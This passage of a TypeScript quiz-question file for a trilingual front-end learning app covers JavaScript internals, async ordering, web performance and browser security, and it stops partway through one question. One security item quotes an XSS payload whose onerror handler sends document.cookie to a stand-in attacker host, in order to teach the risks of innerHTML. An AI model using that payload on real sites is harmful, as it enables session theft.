import type { Question } from '#shared/types/quiz'
import { WHAT_ORDER, choice, output } from './helpers'

const level = 'senior' as const

export const SENIOR: Question[] = [
  // ───────── JavaScript internals ─────────
  output({
    id: 's-static-inherit', level, topic: 'javascript',
    code: `class A {
  static who() { return 'A'; }
}
class B extends A {}

console.log(B.who(), Object.getPrototypeOf(B) === A);`,
    options: ['A true', 'TypeError', 'A false', 'undefined true'],
    answer: 0,
    why: {
      ar: 'extends يربط سلسلتين: prototype الكائنات، وprototype الـ class نفسه. لذلك B يرث الدوال static من A، و Object.getPrototypeOf(B) هو A.',
      en: 'extends links two chains: the instances’ prototype and the class itself. So B inherits static methods from A, and Object.getPrototypeOf(B) is A.',
      tr: 'extends iki zinciri bağlar: nesnelerin prototype’ını ve sınıfın kendisini. Bu yüzden B, A’nın static metotlarını miras alır ve Object.getPrototypeOf(B), A’dır.',
    },
  }),
  output({
    id: 's-private-fields-json', level, topic: 'javascript',
    code: `class Account {
  #balance = 100;
  get balance() { return this.#balance; }
}

const acc = new Account();
console.log(Object.keys(acc), JSON.stringify(acc), acc.balance);`,
    options: ['[] {} 100', "['balance'] {\"balance\":100} 100", '[] {"#balance":100} 100', '[] {} undefined'],
    answer: 0,
    why: {
      ar: 'الحقول الخاصة (#) غير مرئية لـ Object.keys وJSON.stringify، والـ getter موجود على الـ prototype وليس على الكائن نفسه. لذلك تظهر الكائن فارغًا رغم أن acc.balance يعمل.',
      en: 'Private fields (#) are invisible to Object.keys and JSON.stringify, and the getter lives on the prototype, not on the object. So the object looks empty even though acc.balance works.',
      tr: 'Özel alanlar (#) Object.keys ve JSON.stringify için görünmezdir; getter da nesnede değil prototype’tadır. Bu yüzden acc.balance çalışsa da nesne boş görünür.',
    },
  }),
  output({
    id: 's-to-primitive', level, topic: 'javascript',
    code: 'const price = {\n  [Symbol.toPrimitive](hint) {\n    return hint === \'number\' ? 42 : \'forty-two\';\n  },\n};\n\nconsole.log(+price, `${price}`);',
    options: ['42 forty-two', '42 42', 'NaN forty-two', 'forty-two forty-two'],
    answer: 0,
    why: {
      ar: 'Symbol.toPrimitive يتحكّم بتحويل الكائن. الـ + الأحادي يطلب hint "number"، والـ template literal يطلب "string". هكذا تعمل كائنات مثل Date.',
      en: 'Symbol.toPrimitive controls how an object is converted. Unary + asks with hint "number", a template literal asks with "string". This is how objects like Date work.',
      tr: 'Symbol.toPrimitive nesnenin nasıl dönüştürüleceğini belirler. Tekli + "number", template literal ise "string" ipucuyla sorar. Date gibi nesneler böyle çalışır.',
    },
  }),
  output({
    id: 's-proxy-get', level, topic: 'javascript',
    code: 'const settings = new Proxy({}, {\n  get: (target, key) => key in target ? target[key] : `missing ${String(key)}`,\n});\n\nsettings.theme = \'dark\';\nconsole.log(settings.theme, settings.lang);',
    options: ['dark missing lang', 'dark undefined', 'TypeError', 'missing theme missing lang'],
    answer: 0,
    why: {
      ar: 'الـ Proxy يعترض العمليات على الكائن. الكتابة لم يُعترَض عليها فتمّت على target، والقراءة تمر عبر get. هكذا يبني Vue 3 نظام الـ reactivity.',
      en: 'A Proxy intercepts operations on an object. The write was not trapped, so it went to target; reads go through get. This is how Vue 3 builds its reactivity.',
      tr: 'Proxy nesne üzerindeki işlemleri yakalar. Yazma yakalanmadı ve target’a gitti; okumalar get’ten geçer. Vue 3 reaktivitesini böyle kurar.',
    },
  }),
  output({
    id: 's-object-is', level, topic: 'javascript',
    code: `console.log(Object.is(-0, 0), -0 === 0, Object.is(NaN, NaN));`,
    options: ['false true true', 'true true false', 'false false true', 'true true true'],
    answer: 0,
    why: {
      ar: 'Object.is يشبه === مع فرقين: يميّز بين 0 و-0، ويعتبر NaN مساويًا لنفسه. React يستخدم Object.is لمقارنة الـ state والاعتماديات.',
      en: 'Object.is is like === with two differences: it tells 0 and -0 apart, and treats NaN as equal to itself. React uses Object.is to compare state and dependencies.',
      tr: 'Object.is, iki farkla === gibidir: 0 ile -0’ı ayırt eder ve NaN’ı kendisine eşit sayar. React state ve bağımlılıkları Object.is ile karşılaştırır.',
    },
  }),
  output({
    id: 's-max-safe-integer', level, topic: 'javascript',
    code: `console.log(9007199254740993 === 9007199254740992);`,
    options: ['true', 'false', 'NaN', 'RangeError'],
    answer: 0,
    why: {
      ar: 'الأرقام في JavaScript دقيقة حتى Number.MAX_SAFE_INTEGER (2^53 - 1) فقط. بعدها لا يمكن تمثيل كل رقم، فيُقرَّب الرقمان لنفس القيمة. للمعرّفات الكبيرة (مثل IDs من قاعدة بيانات) استخدم BigInt أو نصوصًا.',
      en: 'JavaScript numbers are exact only up to Number.MAX_SAFE_INTEGER (2^53 - 1). Beyond that not every integer exists, so both round to the same value. Use BigInt or strings for large IDs, such as database IDs.',
      tr: 'JavaScript sayıları yalnızca Number.MAX_SAFE_INTEGER’e (2^53 - 1) kadar kesindir. Sonrasında her tam sayı gösterilemez ve ikisi aynı değere yuvarlanır. Büyük kimlikler (veritabanı ID’leri gibi) için BigInt veya metin kullanın.',
    },
  }),
  output({
    id: 's-bigint-mix', level, topic: 'javascript',
    code: `try {
  console.log(10n + 1);
} catch (e) {
  console.log(e.name);
}`,
    options: ['11', '11n', 'TypeError', '101'],
    answer: 2,
    why: {
      ar: 'لا يمكن خلط BigInt مع Number في العمليات الحسابية، حتى لا يضيع جزء من الدقة بصمت. حوّل صراحة: 10n + BigInt(1) أو Number(10n) + 1.',
      en: 'BigInt and Number cannot be mixed in arithmetic, so precision is never lost silently. Convert explicitly: 10n + BigInt(1) or Number(10n) + 1.',
      tr: 'BigInt ile Number aritmetikte karıştırılamaz; böylece hassasiyet sessizce kaybolmaz. Açıkça çevirin: 10n + BigInt(1) veya Number(10n) + 1.',
    },
  }),
  output({
    id: 's-date-month-overflow', level, topic: 'javascript',
    code: `const date = new Date(2024, 0, 31); // 31 January 2024
date.setMonth(1);                  // February

console.log(date.getMonth() + 1, date.getDate());`,
    options: ['2 29', '3 2', '2 31', '3 1'],
    answer: 1,
    why: {
      ar: 'لا يوجد 31 فبراير، فيكمل Date العدّ: فبراير 2024 فيه 29 يومًا، فيصبح التاريخ 2 مارس. عند إضافة شهر لتاريخ، اضبط اليوم أولًا أو استخدم مكتبة تواريخ.',
      en: 'There is no 31 February, so Date rolls over: February 2024 has 29 days, so it becomes 2 March. When adding a month, clamp the day first or use a date library.',
      tr: '31 Şubat diye bir gün yok, Date taşar: Şubat 2024 29 gündür, tarih 2 Mart olur. Ay eklerken önce günü sınırlayın ya da bir tarih kütüphanesi kullanın.',
    },
  }),
  output({
    id: 's-emoji-length', level, topic: 'javascript',
    code: `const like = '👍';
console.log(like.length, [...like].length);`,
    options: ['1 1', '2 1', '2 2', '4 1'],
    answer: 1,
    why: {
      ar: 'length يعدّ وحدات UTF-16، والإيموجي يحتاج وحدتين. الـ spread يمرّ على الحروف الحقيقية (code points). انتبه لهذا في حدود عدد الأحرف بالحقول.',
      en: 'length counts UTF-16 units, and this emoji takes two. Spread walks real characters (code points). Watch out for this in character-limit fields.',
      tr: 'length UTF-16 birimlerini sayar ve bu emoji iki birim kaplar. Spread gerçek karakterleri (code point) dolaşır. Karakter sınırlı alanlarda buna dikkat edin.',
    },
  }),
  output({
    id: 's-memoize-calls', level, topic: 'javascript',
    code: `function memo(fn) {
  const cache = new Map();
  return n => {
    if (cache.has(n)) return cache.get(n);
    const value = fn(n);
    cache.set(n, value);
    return value;
  };
}

let calls = 0;
const square = memo(n => { calls++; return n * n; });

square(3); square(3); square(4);
console.log(calls);`,
    options: ['3', '2', '1', '0'],
    answer: 1,
    why: {
      ar: 'الـ closure يحتفظ بالـ cache بين الاستدعاءات. square(3) الثانية تأتي من الـ cache، فالدالة الأصلية تعمل مرتين فقط (3 و4). هذه فكرة useMemo وcomputed.',
      en: 'The closure keeps the cache between calls. The second square(3) comes from the cache, so the real function runs only twice (3 and 4). This is the idea behind useMemo and computed.',
      tr: 'Closure, önbelleği çağrılar arasında korur. İkinci square(3) önbellekten gelir; asıl fonksiyon yalnızca iki kez çalışır (3 ve 4). useMemo ve computed’ın fikri budur.',
    },
  }),
  output({
    id: 's-debounce', level, topic: 'javascript',
    code: `function debounce(fn, ms) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), ms);
  };
}

const search = debounce(q => console.log(q), 50);
search('r'); search('re'); search('rea');`,
    options: ['r, re, rea', 'rea', 'r', 'r, rea'],
    answer: 1,
    why: {
      ar: 'كل استدعاء جديد يلغي المؤقت السابق ويبدأ واحدًا جديدًا. تعمل الدالة مرة واحدة فقط بعد توقف الاستدعاءات، وبآخر قيمة. مثالي لمربعات البحث.',
      en: 'Each new call cancels the previous timer and starts a new one. The function runs once, after the calls stop, with the last value. Ideal for search boxes.',
      tr: 'Her yeni çağrı önceki zamanlayıcıyı iptal edip yenisini başlatır. Fonksiyon, çağrılar durduktan sonra son değerle bir kez çalışır. Arama kutuları için idealdir.',
    },
  }),
  output({
    id: 's-generator-finally', level, topic: 'javascript',
    code: `function* rows() {
  try {
    yield 1;
    yield 2;
  } finally {
    console.log('cleanup');
  }
}

for (const row of rows()) {
  console.log(row);
  break;
}`,
    options: ['1', '1, cleanup', '1, 2, cleanup', 'cleanup, 1'],
    answer: 1,
    why: {
      ar: 'عند الخروج من for...of بـ break، تستدعي JavaScript الدالة return() على الـ iterator، فيُنفَّذ finally داخل الـ generator. مفيد لإغلاق الاتصالات والملفات.',
      en: 'When for...of exits with break, JavaScript calls return() on the iterator, so the generator’s finally runs. Useful for closing connections and files.',
      tr: 'for...of break ile çıkınca JavaScript iterator üzerinde return() çağırır ve generator’daki finally çalışır. Bağlantıları ve dosyaları kapatmak için kullanışlıdır.',
    },
  }),

  output({
    id: 's-structured-clone-fn', level, topic: 'javascript',
    code: `const state = { count: 1, inc() { this.count++; } };

try {
  structuredClone(state);
  console.log('copied');
} catch (e) {
  console.log(e.name);
}`,
    options: ['copied', 'DataCloneError', 'TypeError', 'SyntaxError'],
    answer: 1,
    why: {
      ar: 'structuredClone ينسخ البيانات فقط (كائنات، مصفوفات، Date، Map…) ولا ينسخ الدوال، فيرمي DataCloneError. انسخ البيانات وحدها، أو أعِد إنشاء الكائن من class.',
      en: 'structuredClone copies data only (objects, arrays, Date, Map…) and cannot copy functions, so it throws a DataCloneError. Clone just the data, or rebuild the object from its class.',
      tr: 'structuredClone yalnızca veriyi kopyalar (nesne, dizi, Date, Map…) ve fonksiyonları kopyalayamaz; DataCloneError fırlatır. Yalnızca veriyi kopyalayın ya da nesneyi sınıfından yeniden oluşturun.',
    },
  }),

  // ───────── Async ─────────
  output({
    id: 's-try-without-await', level, topic: 'async',
    code: `async function load() {
  throw new Error('boom');
}

function run() {
  try {
    return load();
  } catch {
    return 'caught';
  }
}

run().catch(e => console.log('rejected:', e.message));`,
    options: ['caught', 'rejected: boom', 'boom', 'TypeError'],
    answer: 1,
    why: {
      ar: 'load() لا يرمي خطأ متزامنًا، بل يعيد وعدًا مرفوضًا. try/catch لا يلتقط ذلك إلا مع await. لهذا تُكتب return await داخل try إذا أردت التقاط الخطأ.',
      en: 'load() does not throw synchronously; it returns a rejected promise. try/catch only catches that with await. That is why you write return await inside try when you want to catch it.',
      tr: 'load() senkron hata fırlatmaz, reddedilmiş bir promise döndürür. try/catch bunu yalnızca await ile yakalar. Yakalamak istiyorsanız try içinde return await yazmanızın nedeni budur.',
    },
  }),
  output({
    id: 's-event-loop-full', level, topic: 'async',
    prompt: WHAT_ORDER,
    code: `async function a1() {
  console.log('a1 start');
  await a2();
  console.log('a1 end');
}
async function a2() {
  console.log('a2');
}

console.log('start');
setTimeout(() => console.log('timeout'), 0);
a1();
new Promise(r => { console.log('p1'); r(); }).then(() => console.log('p2'));
console.log('end');`,
    options: [
      'start, a1 start, a2, p1, end, a1 end, p2, timeout',
      'start, a1 start, a2, a1 end, p1, end, p2, timeout',
      'start, a1 start, a2, p1, end, p2, a1 end, timeout',
      'start, end, a1 start, a2, p1, a1 end, p2, timeout',
    ],
    answer: 0,
    why: {
      ar: 'الكود المتزامن أولًا: start ثم a1 حتى await (a1 start وa2) ثم منفّذ الـ Promise (p1) ثم end. بعدها الـ microtasks بترتيب إضافتها: متابعة a1 (a1 end) ثم p2. وأخيرًا setTimeout.',
      en: 'Synchronous code first: start, then a1 up to await (a1 start, a2), the Promise executor (p1), then end. Then microtasks in the order they were queued: a1 resumes (a1 end), then p2. setTimeout runs last.',
      tr: 'Önce senkron kod: start, sonra a1 await’e kadar (a1 start, a2), Promise yürütücüsü (p1), sonra end. Ardından microtask’lar eklenme sırasıyla: a1 devam eder (a1 end), sonra p2. setTimeout en son çalışır.',
    },
  }),

  // ───────── Performance ─────────
  choice({
    id: 's-perf-layout-thrashing', level, topic: 'performance',
    code: `for (const box of boxes) {
  const h = box.offsetHeight;      // read
  box.style.height = h * 2 + 'px'; // write
}`,
    prompt: {
      ar: 'هذه الحلقة بطيئة جدًا مع 1000 عنصر. ما السبب الرئيسي؟',
      en: 'This loop is very slow with 1000 boxes. What is the main reason?',
      tr: 'Bu döngü 1000 kutuyla çok yavaş. Ana neden nedir?',
    },
    options: {
      ar: ['كل قراءة بعد كتابة تجبر المتصفح على إعادة حساب الـ Layout فورًا', 'الحلقة for...of بطيئة بطبيعتها', 'تحويل الرقم إلى نص مكلف', 'style.height لا يعمل مع العناصر الكثيرة'],
      en: ['Each read after a write forces the browser to recalculate layout right away', 'for...of loops are slow by nature', 'Converting the number to a string is expensive', 'style.height does not work with many elements'],
      tr: ['Yazmadan sonraki her okuma tarayıcıyı layout’u hemen yeniden hesaplamaya zorlar', 'for...of döngüleri doğası gereği yavaştır', 'Sayıyı metne çevirmek pahalıdır', 'style.height çok öğeyle çalışmaz'],
    },
    answer: 0,
    why: {
      ar: 'هذا "layout thrashing": المتصفح يؤجّل حساب الـ Layout، لكن قراءة offsetHeight بعد تعديل تجبره على الحساب فورًا، 1000 مرة. الحل: اقرأ كل القيم أولًا، ثم اكتب كل التعديلات.',
      en: 'This is layout thrashing: the browser normally delays layout, but reading offsetHeight after a change forces it to run immediately, 1000 times. Fix: read all values first, then do all the writes.',
      tr: 'Buna layout thrashing denir: tarayıcı layout’u normalde erteler, ama değişiklikten sonra offsetHeight okumak onu hemen, 1000 kez çalıştırır. Çözüm: önce tüm değerleri okuyun, sonra tüm yazmaları yapın.',
    },
  }),
  choice({
    id: 's-perf-lcp-lazy', level, topic: 'performance',
    code: `<img src="hero.webp" loading="lazy" alt="…">`, codeLang: 'html',
    prompt: {
      ar: 'هذه صورة الـ hero الكبيرة في أعلى الصفحة. ما أثر loading="lazy" عليها؟',
      en: 'This is the big hero image at the top of the page. What does loading="lazy" do to it?',
      tr: 'Bu, sayfanın üstündeki büyük hero görseli. loading="lazy" ona ne yapar?',
    },
    options: {
      ar: ['يؤخّر تحميلها فيسوء الـ LCP', 'يحسّن الـ LCP', 'لا أثر له على الصور الظاهرة', 'يمنع ظهورها على الموبايل'],
      en: ['It delays the download and makes LCP worse', 'It improves LCP', 'It has no effect on visible images', 'It hides the image on mobile'],
      tr: ['İndirmeyi geciktirir ve LCP’yi kötüleştirir', 'LCP’yi iyileştirir', 'Görünen görsellerde etkisi yoktur', 'Mobilde görseli gizler'],
    },
    answer: 0,
    why: {
      ar: 'غالبًا تكون صورة الـ hero هي عنصر الـ LCP. التحميل الكسول ينتظر حساب الـ Layout قبل طلبها فيتأخر ظهورها. للصور الظاهرة من البداية استخدم fetchpriority="high"، واترك lazy للصور الأسفل.',
      en: 'The hero image is usually the LCP element. Lazy loading waits for layout before requesting it, so it appears later. For above-the-fold images use fetchpriority="high"; keep lazy for images further down.',
      tr: 'Hero görseli genellikle LCP öğesidir. Lazy loading istemeden önce layout’u bekler, görsel daha geç görünür. Ekranın üstündeki görseller için fetchpriority="high" kullanın; lazy’yi aşağıdaki görsellere bırakın.',
    },
  }),
  choice({
    id: 's-perf-cls-dimensions', level, topic: 'performance',
    prompt: {
      ar: 'النص يقفز للأسفل عندما تتحمّل الصور. أي تعديل يحل المشكلة (CLS)؟',
      en: 'Text jumps down when images load. Which change fixes it (CLS)?',
      tr: 'Görseller yüklenince metin aşağı kayıyor. Hangi değişiklik sorunu (CLS) çözer?',
    },
    options: {
      ar: ['إضافة width وheight (أو aspect-ratio) للصور', 'إضافة loading="lazy"', 'ضغط الصور أكثر', 'تحويل الصور إلى PNG'],
      en: ['Add width and height (or aspect-ratio) to the images', 'Add loading="lazy"', 'Compress the images more', 'Convert the images to PNG'],
      tr: ['Görsellere width ve height (veya aspect-ratio) ekleyin', 'loading="lazy" ekleyin', 'Görselleri daha çok sıkıştırın', 'Görselleri PNG’ye çevirin'],
    },
    answer: 0,
    why: {
      ar: 'بدون أبعاد لا يعرف المتصفح حجم الصورة قبل تحميلها، فيعطيها ارتفاع 0 ثم يزيح المحتوى. مع width وheight يحجز المساحة مسبقًا ولا يحدث قفز.',
      en: 'Without dimensions the browser does not know the size before the image loads, gives it 0 height, then pushes content down. With width and height it reserves the space up front.',
      tr: 'Boyutlar olmadan tarayıcı görsel yüklenmeden boyutunu bilmez, 0 yükseklik verir ve sonra içeriği iter. width ve height ile alanı önceden ayırır.',
    },
  }),
  choice({
    id: 's-perf-long-task', level, topic: 'performance',
    prompt: {
      ar: 'زر "تصفية" يعالج 50,000 صف دفعة واحدة ويجمّد الصفحة 800ms (INP سيئ). ما الحل الأنسب على الواجهة؟',
      en: 'A "Filter" button processes 50,000 rows in one go and freezes the page for 800ms (bad INP). What is the best front-end fix?',
      tr: '"Filtrele" butonu 50.000 satırı tek seferde işliyor ve sayfayı 800ms donduruyor (kötü INP). En iyi ön yüz çözümü nedir?',
    },
    options: {
      ar: ['تقسيم العمل لأجزاء وإعطاء المتصفح فرصة للرسم بينها، أو نقله إلى Web Worker', 'وضعه داخل async function', 'استخدام var بدل let', 'زيادة z-index للزر'],
      en: ['Split the work into chunks and yield to the browser in between, or move it to a Web Worker', 'Wrap it in an async function', 'Use var instead of let', 'Raise the button’s z-index'],
      tr: ['İşi parçalara bölüp aralarda tarayıcıya fırsat verin ya da bir Web Worker’a taşıyın', 'async bir fonksiyona sarın', 'let yerine var kullanın', 'Butonun z-index’ini artırın'],
    },
    answer: 0,
    why: {
      ar: 'JavaScript يعمل على خيط واحد، وأي مهمة طويلة تمنع الرسم والاستجابة. كتابة async وحدها لا تقسّم العمل. إمّا أن تقسّمه وتترك المتصفح يتنفّس (مثل await scheduler.yield() أو setTimeout)، أو تنقله إلى Worker.',
      en: 'JavaScript runs on one thread, and any long task blocks painting and input. Marking it async alone does not split the work. Either chunk it and yield (await scheduler.yield() or setTimeout), or move it to a Worker.',
      tr: 'JavaScript tek iş parçacığında çalışır; uzun her görev çizimi ve girdiyi engeller. Sadece async yazmak işi bölmez. Ya parçalayıp araya fırsat verin (await scheduler.yield() veya setTimeout) ya da bir Worker’a taşıyın.',
    },
  }),
  choice({
    id: 's-perf-code-split', level, topic: 'performance',
    prompt: {
      ar: 'صفحة الإعدادات تستخدم مكتبة رسوم بيانية حجمها 300KB، والصفحة الرئيسية لا تحتاجها. ما الأفضل؟',
      en: 'The settings page uses a 300KB charting library that the home page does not need. What is best?',
      tr: 'Ayarlar sayfası 300KB’lık bir grafik kütüphanesi kullanıyor, ana sayfanın buna ihtiyacı yok. En iyisi nedir?',
    },
    options: {
      ar: ['تحميلها بـ import() الديناميكي عند فتح صفحة الإعدادات فقط', 'تحميلها في <head> لتكون جاهزة', 'نسخ كودها داخل الملف الرئيسي', 'تحميلها من CDN في كل الصفحات'],
      en: ['Load it with dynamic import() only when the settings page opens', 'Load it in <head> so it is ready', 'Copy its code into the main bundle', 'Load it from a CDN on every page'],
      tr: ['Yalnızca ayarlar sayfası açılınca dinamik import() ile yükleyin', 'Hazır olsun diye <head>’de yükleyin', 'Kodunu ana pakete kopyalayın', 'Her sayfada CDN’den yükleyin'],
    },
    answer: 0,
    why: {
      ar: 'import() الديناميكي ينشئ ملفًا منفصلًا (code splitting) لا يُحمَّل إلا عند الحاجة، فيصغر الـ JavaScript الأولي وتفتح الصفحة الرئيسية أسرع. Nuxt وVite يفعلان ذلك للصفحات تلقائيًا.',
      en: 'Dynamic import() creates a separate chunk (code splitting) that loads only when needed, so the initial JavaScript is smaller and the home page opens faster. Nuxt and Vite already do this for routes.',
      tr: 'Dinamik import(), yalnızca gerektiğinde yüklenen ayrı bir parça oluşturur (code splitting); ilk JavaScript küçülür ve ana sayfa daha hızlı açılır. Nuxt ve Vite bunu sayfalar için zaten yapar.',
    },
  }),
  choice({
    id: 's-perf-scroll-raf', level, topic: 'performance',
    prompt: {
      ar: 'شريط تقدّم القراءة يتحدّث مع كل حدث scroll ويسبب تقطيعًا. ما الأنسب؟',
      en: 'A reading-progress bar updates on every scroll event and stutters. What fits best?',
      tr: 'Okuma ilerleme çubuğu her scroll olayında güncelleniyor ve takılıyor. En uygunu nedir?',
    },
    options: {
      ar: ['تحديثه مرة واحدة لكل إطار عبر requestAnimationFrame', 'debounce بـ 500ms', 'setInterval كل 1ms', 'إعادة تحميل الصفحة عند التمرير'],
      en: ['Update it at most once per frame with requestAnimationFrame', 'Debounce it by 500ms', 'Use setInterval every 1ms', 'Reload the page on scroll'],
      tr: ['requestAnimationFrame ile en fazla kare başına bir kez güncelleyin', '500ms debounce uygulayın', 'Her 1ms’de setInterval kullanın', 'Kaydırmada sayfayı yenileyin'],
    },
    answer: 0,
    why: {
      ar: 'حدث scroll قد ينطلق أكثر من مرة في الإطار الواحد. requestAnimationFrame يجمّع التحديث في مرة واحدة قبل الرسم التالي فيبقى سلسًا. الـ debounce هنا سيجعل الشريط يتأخر ولا يتحرك أثناء التمرير.',
      en: 'scroll can fire several times per frame. requestAnimationFrame groups the update into one call right before the next paint, so it stays smooth. A debounce would make the bar lag and freeze while scrolling.',
      tr: 'scroll bir karede birden çok kez tetiklenebilir. requestAnimationFrame güncellemeyi bir sonraki çizimden hemen önce tek çağrıda toplar ve akıcı kalır. Debounce çubuğu geciktirir ve kaydırırken dondurur.',
    },
  }),
  choice({
    id: 's-perf-listener-leak', level, topic: 'performance',
    code: `onMounted(() => {
  window.addEventListener('resize', updateLayout)
})`, codeLang: 'js',
    prompt: {
      ar: 'المكوّن يُفتح ويُغلق كثيرًا، ومع الوقت تصبح الصفحة أبطأ. ما الناقص؟',
      en: 'This component mounts and unmounts often, and the page gets slower over time. What is missing?',
      tr: 'Bu bileşen sık sık açılıp kapanıyor ve sayfa zamanla yavaşlıyor. Eksik olan nedir?',
    },
    options: {
      ar: ['إزالة المستمع عند onUnmounted (removeEventListener أو AbortController)', 'استخدام onBeforeMount بدل onMounted', 'تغيير resize إلى scroll', 'لا شيء، المتصفح يزيله تلقائيًا'],
      en: ['Remove the listener in onUnmounted (removeEventListener or AbortController)', 'Use onBeforeMount instead of onMounted', 'Change resize to scroll', 'Nothing, the browser removes it automatically'],
      tr: ['onUnmounted’da dinleyiciyi kaldırın (removeEventListener veya AbortController)', 'onMounted yerine onBeforeMount kullanın', 'resize’ı scroll yapın', 'Hiçbir şey, tarayıcı otomatik kaldırır'],
    },
    answer: 0,
    why: {
      ar: 'window يعيش طوال عمر الصفحة. كل فتح للمكوّن يضيف مستمعًا جديدًا يحتفظ بالمكوّن القديم في الذاكرة (memory leak) ويعمل في كل resize. أزله في onUnmounted، وفي React أعِد دالة تنظيف من useEffect.',
      en: 'window lives as long as the page. Every mount adds another listener that keeps the old component in memory (a leak) and runs on every resize. Remove it in onUnmounted; in React, return a cleanup from useEffect.',
      tr: 'window sayfa boyunca yaşar. Her açılış eski bileşeni bellekte tutan (sızıntı) ve her resize’da çalışan yeni bir dinleyici ekler. onUnmounted’da kaldırın; React’te useEffect’ten temizlik fonksiyonu döndürün.',
    },
  }),

  // ───────── Security ─────────
  choice({
    id: 's-sec-innerhtml', level, topic: 'security',
    code: `comment.innerHTML = userInput;`,
    prompt: {
      ar: 'مستخدم كتب في التعليق: <img src=x onerror="fetch(\'//evil.io?c=\'+document.cookie)">. ماذا يحدث؟',
      en: 'A user typed this as a comment: <img src=x onerror="fetch(\'//evil.io?c=\'+document.cookie)">. What happens?',
      tr: 'Bir kullanıcı yorum olarak şunu yazdı: <img src=x onerror="fetch(\'//evil.io?c=\'+document.cookie)">. Ne olur?',
    },
    options: {
      ar: ['يُنفَّذ الكود عند كل من يرى التعليق (XSS)', 'يظهر النص كما هو', 'المتصفح يمنع أي onerror تلقائيًا', 'يظهر خطأ في الـ console فقط'],
      en: ['The code runs for everyone who views the comment (XSS)', 'The text shows as is', 'Browsers block every onerror automatically', 'Only a console error appears'],
      tr: ['Kod, yorumu gören herkeste çalışır (XSS)', 'Metin olduğu gibi görünür', 'Tarayıcılar her onerror’ı otomatik engeller', 'Yalnızca konsolda hata görünür'],
    },
    answer: 0,
    why: {
      ar: 'innerHTML يحلّل النص كـ HTML، وأحداث مثل onerror تُنفَّذ حتى لو لم تُنفَّذ وسوم <script>. استخدم textContent للنصوص، وإذا احتجت HTML فنظّفه بمكتبة مثل DOMPurify.',
      en: 'innerHTML parses the text as HTML, and handlers like onerror run even though <script> tags do not. Use textContent for text; if you really need HTML, sanitize it with a library like DOMPurify.',
      tr: 'innerHTML metni HTML olarak işler; <script> etiketleri çalışmasa da onerror gibi işleyiciler çalışır. Metin için textContent kullanın; HTML gerçekten gerekiyorsa DOMPurify gibi bir kütüphaneyle temizleyin.',
    },
  }),
  choice({
    id: 's-sec-token-storage', level, topic: 'security',
    prompt: {
      ar: 'ما الخطر الأساسي في حفظ access token في localStorage؟',
      en: 'What is the main risk of keeping an access token in localStorage?',
      tr: 'Access token’ı localStorage’da tutmanın ana riski nedir?',
    },
    options: {
      ar: ['أي ثغرة XSS تستطيع قراءته وإرساله للمهاجم', 'يُحذف عند إغلاق التبويب', 'حجمه محدود بـ 1KB', 'يُرسَل تلقائيًا مع كل طلب'],
      en: ['Any XSS bug can read it and send it to an attacker', 'It is deleted when the tab closes', 'It is limited to 1KB', 'It is sent automatically with every request'],
      tr: ['Herhangi bir XSS açığı onu okuyup saldırgana gönderebilir', 'Sekme kapanınca silinir', '1KB ile sınırlıdır', 'Her istekle otomatik gönderilir'],
    },
    answer: 0,
    why: {
      ar: 'كل JavaScript على الصفحة يستطيع قراءة localStorage. الكوكي HttpOnly لا يمكن لـ JavaScript قراءتها، فهي أصعب سرقة عبر XSS، لكنها تحتاج حماية من CSRF (مثل SameSite).',
      en: 'Any JavaScript on the page can read localStorage. An HttpOnly cookie cannot be read by JavaScript, so XSS cannot steal it as easily, but it needs CSRF protection (such as SameSite).',
      tr: 'Sayfadaki her JavaScript localStorage’ı okuyabilir. HttpOnly bir çerez JavaScript ile okunamaz, XSS ile çalınması daha zordur; ama CSRF koruması gerekir (SameSite gibi).',
    },
  }),
  choice({
    id: 's-sec-samesite', level, topic: 'security',
    prompt: {
      ar: 'موقع ضار يرسل فورم POST إلى bank.com/transfer. أي إعداد للكوكي يمنع إرسال جلسة المستخدم مع هذا الطلب؟',
      en: 'A malicious site submits a POST form to bank.com/transfer. Which cookie setting stops the user’s session from being sent with it?',
      tr: 'Kötü niyetli bir site bank.com/transfer’e POST formu gönderiyor. Hangi çerez ayarı kullanıcının oturumunun bu istekle gitmesini engeller?',
    },
    options: ['SameSite=Lax', 'Secure', 'HttpOnly', 'Max-Age=0'],
    answer: 0,
    why: {
      ar: 'SameSite=Lax (أو Strict) يمنع إرسال الكوكي مع طلبات POST القادمة من موقع آخر، وهذا يحمي من CSRF. HttpOnly يحمي من قراءة JavaScript، وSecure يجعلها عبر HTTPS فقط.',
      en: 'SameSite=Lax (or Strict) stops the cookie from going with POST requests that come from another site, which blocks CSRF. HttpOnly protects against JavaScript reads, and Secure limits it to HTTPS.',
      tr: 'SameSite=Lax (veya Strict), başka siteden gelen POST isteklerinde çerezin gönderilmesini engeller; bu CSRF’i önler. HttpOnly JavaScript okumasına, Secure ise yalnızca HTTPS’e karşı korur.',
    },
  }),
  choice({
    id: 's-sec-csp', level, topic: 'security',
    code: `Content-Security-Policy: script-src 'self'`, codeLang: 'html',
    prompt: {
      ar: 'ما الذي يفعله هذا الـ header؟',
      en: 'What does this header do?',
      tr: 'Bu başlık ne yapar?',
    },
    options: {
      ar: ['يسمح فقط بسكربتات من نفس الموقع ويمنع السكربتات المضمّنة inline', 'يشفّر السكربتات', 'يمنع CORS', 'يسرّع تحميل السكربتات'],
      en: ['It only allows scripts from your own origin and blocks inline scripts', 'It encrypts scripts', 'It blocks CORS', 'It speeds up script loading'],
      tr: ['Yalnızca kendi origin’inizden betiklere izin verir ve satır içi betikleri engeller', 'Betikleri şifreler', 'CORS’u engeller', 'Betik yüklemeyi hızlandırır'],
    },
    answer: 0,
    why: {
      ar: 'CSP طبقة حماية إضافية ضد XSS: حتى لو حقن مهاجم سكربتًا أو onclick في الصفحة، يرفض المتصفح تنفيذه لأنه ليس من مصدر مسموح.',
      en: 'CSP is an extra layer against XSS: even if an attacker injects a script or an onclick into the page, the browser refuses to run it because it does not come from an allowed source.',
      tr: 'CSP, XSS’e karşı ek bir katmandır: saldırgan sayfaya betik veya onclick enjekte etse bile tarayıcı izinli bir kaynaktan gelmediği için çalıştırmaz.',
    },
  }),
  choice({
    id: 's-sec-dangerously', level, topic: 'security',
    code: `<div dangerouslySetInnerHTML={{ __html: post.body }} />`, codeLang: 'jsx',
    prompt: {
      ar: 'post.body يأتي من محرّر يكتب فيه المستخدمون. ما الصحيح؟',
      en: 'post.body comes from an editor that users write in. What is correct?',
      tr: 'post.body, kullanıcıların yazdığı bir editörden geliyor. Doğru olan nedir?',
    },
    options: {
